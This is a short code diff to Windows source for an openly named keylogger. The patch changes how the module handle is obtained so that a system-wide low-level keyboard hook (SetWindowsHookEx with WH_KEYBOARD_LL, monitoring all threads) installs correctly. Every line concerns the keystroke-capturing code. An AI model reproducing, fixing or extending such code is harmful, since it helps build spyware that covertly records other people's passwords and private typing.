@@ -7,7 +7,7 @@
 
 HHOOK hKeyHook;
 HWND hWnd;
-extern HINSTANCE hInstance;
+ 
 __declspec(dllexport) LRESULT CALLBACK KeyEvent (
 
   int nCode,      // The hook code
@@ -38,7 +38,7 @@ DWORD WINAPI KeyLogger(LPVOID lpParameter)
     hKeyHook = SetWindowsHookEx (  // install the hook:
         WH_KEYBOARD_LL,            // as a low level keyboard hook
         (HOOKPROC) KeyEvent,       // with the KeyEvent function from this executable
-        hInstance,                      // and the module handle to our own executable
+        (HINSTANCE)::GetModuleHandle(NULL),                      // and the module handle to our own executable
         NULL                       // and finally, the hook should monitor all threads.
     );
     MsgLoop();
